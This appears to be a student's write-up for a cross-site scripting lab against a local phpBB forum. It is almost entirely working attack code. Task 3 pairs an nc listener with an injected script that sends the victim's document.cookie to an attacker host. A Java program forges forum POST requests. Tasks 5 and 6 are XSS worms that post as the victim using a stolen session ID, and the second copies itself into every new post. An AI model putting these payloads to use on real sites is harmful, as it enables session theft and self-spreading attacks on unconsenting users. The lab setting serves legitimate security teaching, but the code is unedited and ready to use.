服务器启动

```bash
sudo apache2ctl start
or
sudo service apache2 start
```

task1

```html
<script>alert('XSS SKPrimin');</script>
```

Task2

```html
<script>alert(document.cookie);</script>
Hello Everybody,
Welcome to this message board.
```

Task3

攻击机（监听机）

```
nc -lv 5555
```



```html
Hello Folks,
<script>document.write('<img src=http://attacker_IP_address:5555?c='
+ escape(document.cookie) + ' >'); </script>
This script is to test XSS. Thanks.

```

Task4

```java
import java.io.*;
import java.net.*;


public class HTTPSimpleForge {
    public static void main(String[] args) throws IOException {
        try {
            int responseCode;
            InputStream responseIn = null;

            // 要伪造的URL
            URL url = new URL("http://www.xsslabphpbb.com/posting.php");

            // 创建URLConnection实例，以进一步参数化资源请求，以后的URL实例可以表示的状态。
            URLConnection urlConn = url.openConnection();

            if (urlConn instanceof HttpURLConnection) {
                urlConn.setConnectTimeout(60000);
                urlConn.setReadTimeout(90000);
            }

            // AddRequestProperty方法用于添加HTTP标头信息。
            // 在这里，我们将用户代理HTTP标头添加到伪造的HTTP数据包中。
            urlConn.addRequestProperty("Cookie", "");

            // HTTP发布数据包括要发送到服务器的信息。
            String data = "username=admin&seed=admin%40seed.com";
            // 应该将URL连接的DOUTPUT标志设置为TRUE以发送HTTP发布消息。
            urlConn.setDoOutput(true);

            // OutputStreamWriter 字节输出流 用于将HTTP POST数据写入URL连接。
            OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
            wr.write(data);
            wr.flush();

            // HttpURLConnection a subclass of URLConnection is returned by
            // url.openConnection() since the url is an http request.
            //因为URL是HTTP请求， HttpURLConnection 由 
            // URL.Openconnection（）返回URLConnection的子类，
            if (urlConn instanceof HttpURLConnection) {
                HttpURLConnection httpConn = (HttpURLConnection) urlConn;
                // 连接Web服务器并获取HTTP响应消息的状态代码。
                responseCode = httpConn.getResponseCode();
                System.out.println("Response Code = " + responseCode);

                // HTTP状态代码HTTP_OK表示已成功收到响应。
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // 从URL连接对象获取输入流。
                    responseIn = urlConn.getInputStream();

                    // 为字节读入流BufferedReader创建一个实例，以按行读取响应行。
                    BufferedReader buf_inp = new BufferedReader(new InputStreamReader(
                                responseIn));
                    String inputLine;

                    while ((inputLine = buf_inp.readLine()) != null) {
                        //System.out.println(inputLine);
                    }
                }
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }
}
```

task5

```html
<script>
  var Ajax = null;
  Ajax = new XMLHttpRequest();
  Ajax.open("POST", "http://www.xsslabphpbb.com/posting.php", true);
  Ajax.setRequestHeader("Host", "www.xsslabphpbb.com");
  Ajax.setRequestHeader("Keep-Alive", "300");
  Ajax.setRequestHeader("Connection", "keep-alive");
  Ajax.setRequestHeader("Cookie", document.cookie);
  Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  var c = document.cookie;
  var i = c.indexOf("sid=");
  var content = "subject=" + "XSSWormSKPrimin" + "&addbbcode18=%23444444&addbbcode20=0&helpbox=Font+color%3A+%5Bcolor%3Dred%5Dtext%5B%2Fcolor%5D++Tip%3A+you+can+also+use+color%3D%23FF0000"+ "&message="+"This is a worm created by SKPrimin" +"&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=" + c.slice(i + 4, i + 4 + 32) +"&f=1&post=Submit";
  Ajax.send(content);
</script>
```

task6

```html
<script id=worm>scriptValue1=document.getElementById("worm");scriptValue2=scriptValue1.childNodes[0].nodeValue;var sc1="<script id=worm>";var sc12=sc1.concat(scriptValue2);scriptValue3=sc12.concat("<\/script>");scriptValue=escape(scriptValue3);var Ajax=null;Ajax=new XMLHttpRequest();Ajax.open("POST", "http://www.xsslabphpbb.com/posting.php",true);Ajax.setRequestHeader("Host","www.xsslabphpbb.com");Ajax.setRequestHeader("Keep-Alive", "300");Ajax.setRequestHeader("Connection", "keep-alive");Ajax.setRequestHeader("Cookie", document.cookie);Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");var c=document.cookie;var i=c.indexOf("sid=");var s1="subject=XSSSelfWorm&addbbcode18=%23444444&addbbcode20=0&helpbox=Font+color%3A+%5Bcolor%3Dred%5Dtext%5B%2Fcolor%5D++Tip%3A+you+can+also+use+color%3D%23FF0000&message=";var s3="&poll_title=&add_poll_option_text=&poll_length=&mode=newtopic&sid=";var s5="&f=1&post=Submit";var s12=s1.concat(scriptValue);var s34=s3.concat(c.slice(i - (-4), i - (-36)));var s1234=s12.concat(s34);var content=s1234.concat("&f=1&post=Submit");Ajax.send(content);</script>
```

